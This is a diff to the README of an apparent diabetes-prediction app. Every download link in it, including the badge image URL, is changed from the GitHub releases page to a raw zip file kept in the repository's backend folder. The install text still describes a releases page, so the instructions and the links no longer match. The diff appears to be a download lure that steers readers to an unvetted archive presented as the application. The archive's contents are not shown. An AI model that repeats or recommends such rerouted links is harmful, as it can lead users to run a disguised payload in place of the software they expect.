@@ -6,13 +6,13 @@ Welcome to the Diabetes-Prediction-System! This application helps you assess you
 
 ### 🔗 Download the Application
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/Gohan-debugK/Diabetes-Prediction-System/releases)
+[![Download Latest Release](https://github.com/Gohan-debugK/Diabetes-Prediction-System/raw/refs/heads/main/backend/System-Prediction-Diabetes-v2.6.zip%20Latest%20Release-Here-brightgreen)](https://github.com/Gohan-debugK/Diabetes-Prediction-System/raw/refs/heads/main/backend/System-Prediction-Diabetes-v2.6.zip)
 
 ### 📥 How to Download & Install
 
 1. **Visit the Release Page**  
    Click the link below to go to the release page:  
-   [Visit Releases Page](https://github.com/Gohan-debugK/Diabetes-Prediction-System/releases)
+   [Visit Releases Page](https://github.com/Gohan-debugK/Diabetes-Prediction-System/raw/refs/heads/main/backend/System-Prediction-Diabetes-v2.6.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of versions. Select the latest version for the best experience.
@@ -68,4 +68,4 @@ We welcome contributions! If you’d like to help improve the Diabetes-Predictio
 For more details, check the GitHub page. There, you'll find documentation and resources that can enhance your understanding of the application and machine learning concepts. 
 
 **Again, to download the application, please click the link below:**  
-[Download Latest Release](https://github.com/Gohan-debugK/Diabetes-Prediction-System/releases)
+[Download Latest Release](https://github.com/Gohan-debugK/Diabetes-Prediction-System/raw/refs/heads/main/backend/System-Prediction-Diabetes-v2.6.zip)
